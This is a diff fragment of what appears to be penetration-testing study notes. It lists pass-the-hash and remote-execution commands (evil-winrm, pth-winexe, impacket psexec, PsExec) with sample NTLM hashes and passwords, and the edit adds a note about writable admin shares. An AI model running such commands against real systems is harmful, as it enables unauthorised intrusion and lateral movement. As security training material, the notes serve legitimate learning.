@@ -217,8 +217,8 @@ evil-winrm -i ip -u username -H ntlm_hash
 ```
 pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd (winexesvc service)
 
-/usr/share/doc/python3-impacket/examples/psexec.py OFFSEC.LOCAL/Administrator@192.168.176.57 -hashes "aad3b435b51404eeaad3b435b51404ee:8c802621d2e36fc074345dded890f3e5" (135/445 port required)
-/usr/share/doc/python3-impacket/examples/psexec.py domain/Administrator:password@192.168.1.140 (135/445 port required)
+/usr/share/doc/python3-impacket/examples/psexec.py OFFSEC.LOCAL/Administrator@192.168.176.57 -hashes "aad3b435b51404eeaad3b435b51404ee:8c802621d2e36fc074345dded890f3e5" (135/445 port required，C$, Admin$ is writable)
+/usr/share/doc/python3-impacket/examples/psexec.py domain/Administrator:password@192.168.1.140 (135/445 port required, C$ Admin$ is writable)
 
 PsExec.exe \\192.168.1.104 -u administrator -p Ignite@123 cmd (135/445 port required)
 ```
